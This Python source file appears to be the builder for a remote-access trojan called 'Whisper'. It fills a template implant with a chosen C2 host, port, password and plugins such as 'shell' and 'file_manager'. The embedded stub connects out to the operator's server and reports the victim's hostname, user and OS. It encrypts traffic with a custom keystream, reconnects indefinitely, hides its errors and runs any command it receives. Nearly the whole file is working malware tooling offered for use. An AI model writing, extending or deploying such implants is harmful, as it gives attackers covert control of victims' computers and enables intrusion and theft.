"""
Generates a minimal agent stub by selecting only the needed plugins.
Usage: python stub_generator.py --plugins shell,file_manager --host 192.168.1.100 --port 4443
"""

import os, sys, re
from plugins import PLUGIN_REGISTRY, generate_plugin, get_info

BASE_TEMPLATE = r"""import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform

C2_HOST = "{{C2_HOST}}"
C2_PORT = {{C2_PORT}}
ENCRYPTION_PASSWORD = "{{ENCRYPTION_PASSWORD}}"
RECONNECT_DELAY = {{RECONNECT_DELAY}}

def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), b"whisper_salt_2024", 100000, 32)
def _eb(p, k):
    iv = os.urandom(16); ks, c = b"", 0
    while len(ks) < len(p):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    ct = bytes(x ^ y for x, y in zip(p, ks))
    return iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct
def _db(d, k):
    iv, tag, ct = d[:16], d[16:32], d[32:]
    if not hmac.compare_digest(tag, hmac.new(k, iv + ct, hashlib.sha256).digest()[:16]): raise ValueError("integrity")
    ks, c = b"", 0
    while len(ks) < len(ct):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    return bytes(x ^ y for x, y in zip(ct, ks))
def enc(d): return base64.b64encode(_eb(json.dumps(d).encode(), _k()))
def dec(d): return json.loads(_db(base64.b64decode(d), _k()))
def rms(s):
    r = s.recv(4)
    if not r: return None
    sz = int.from_bytes(r, "big"); d = b""
    while len(d) < sz:
        c = s.recv(sz - len(d))
        if not c: return None
        d += c
    return dec(d)
def sms(s, d):
    p = enc(d); s.sendall(len(p).to_bytes(4, "big") + p)

_CMDS = {}
{{PLUGIN_CODE}}
{{COMMANDS}}

def _cmd_info(m):
    return {"os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid(),"cwd":os.getcwd()}
_CMDS["info"] = _cmd_info

def _main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30); s.connect((C2_HOST, C2_PORT))
            sms(s, {"type":"init","os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid()})
            s.settimeout(15)
            while True:
                try:
                    m = rms(s)
                    if m is None: break
                except socket.timeout:
                    try:
                        s.settimeout(1)
                        sms(s, {"type":"ping"})
                    except:
                        pass
                    finally:
                        s.settimeout(15)
                    continue
                if m["type"] == "exit": s.close(); return
                fn = _CMDS.get(m["type"])
                if fn:
                    try:
                        r = fn(m)
                        if r is not None:
                            _exit = r.pop("_exit", False)
                            sms(s, {"type":"response",**r})
                            if _exit: s.close(); return
                    except Exception as e: sms(s, {"type":"response","error":str(e)})
                else:
                    sms(s, {"type":"response","error":f"Unknown command: {m['type']}"})
        except: pass
        finally:
            try: s.close()
            except: pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    _main()
"""

def generate_stub(plugin_names, host="127.0.0.1", port=4443, password="whisper_secret_key", delay=10):
    plugin_code = []
    all_cmds = {}
    for name in plugin_names:
        code, cmds = generate_plugin(name)
        if code:
            plugin_code.append(f"\n# --- {name} plugin ---\n{code}")
            all_cmds.update(cmds)

    cmds_str = "\n".join(f"_CMDS[{k!r}] = {v}" for k, v in all_cmds.items())

    stub = BASE_TEMPLATE.replace("{{PLUGIN_CODE}}", "\n".join(plugin_code))
    stub = stub.replace("{{COMMANDS}}", cmds_str)
    stub = stub.replace('"{{C2_HOST}}"', repr(host))
    stub = stub.replace("{{C2_PORT}}", str(port))
    stub = stub.replace('"{{ENCRYPTION_PASSWORD}}"', repr(password))
    stub = stub.replace("{{RECONNECT_DELAY}}", str(delay))
    return stub

def estimate_size(stub_text, plugin_names):
    return len(stub_text.encode("utf-8"))

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Whisper Stub Generator")
    parser.add_argument("--plugins", default="shell,file_manager", help="Comma-separated plugin list")
    parser.add_argument("--host", default="127.0.0.1", help="C2 host")
    parser.add_argument("--port", type=int, default=4443, help="C2 port")
    parser.add_argument("--password", default="whisper_secret_key", help="Encryption password")
    parser.add_argument("--delay", type=int, default=10, help="Reconnect delay")
    parser.add_argument("--output", default="stub.py", help="Output file path")
    args = parser.parse_args()

    plugins = [p.strip() for p in args.plugins.split(",") if p.strip()]
    available = set(PLUGIN_REGISTRY.keys())
    for p in plugins:
        if p not in available:
            print(f"[!] Unknown plugin: {p}. Available: {', '.join(sorted(available))}")
            return

    stub = generate_stub(plugins, args.host, args.port, args.password, args.delay)
    with open(args.output, "w") as f:
        f.write(stub)

    size = estimate_size(stub, plugins)
    print(f"[+] Generated: {args.output}")
    print(f"[+] Size: {size:,} bytes ({size/1024:.1f} KB)")
    print(f"[+] Plugins: {', '.join(plugins)}")

if __name__ == "__main__":
    main()
